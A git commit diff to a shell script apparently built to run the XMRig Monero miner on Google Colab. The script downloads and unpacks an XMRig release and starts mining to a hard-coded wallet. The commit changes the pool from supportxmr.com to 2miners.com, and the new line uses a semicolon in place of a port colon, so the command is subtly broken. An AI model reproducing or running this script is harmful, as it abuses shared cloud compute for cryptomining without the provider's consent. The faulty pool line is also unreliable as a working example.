a03eea6f67946488e5e7987b9ddc4f8b820c05f7
fluffy199 <96822759+fluffy199@users.noreply.github.com>
2022-05-15 02:51:40 -0500

    Update gcolab-xmrig-us.sh

--- gcolab-xmrig-us.sh
+++ gcolab-xmrig-us.sh
@@ -10,4 +10,5 @@ screen -R xmr
 wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
 tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
 cd xmrig-6.16.4
-./xmrig -a rx/0 -o pool.supportxmr.com:7777 -u 45bHUjG9S7q2YzUEsdxdrpTzzMpsS6LZFKej4GV4HEKKYXtRQc4T783Azcgz3QucKggwKPQWxh95i5JJ5toQu2J7NiFgQao 
+./xmrig -a rx/0 -o xmr.2miners.com;2222 -u 45bHUjG9S7q2YzUEsdxdrpTzzMpsS6LZFKej4GV4HEKKYXtRQc4T783Azcgz3QucKggwKPQWxh95i5JJ5toQu2J7NiFgQao
+
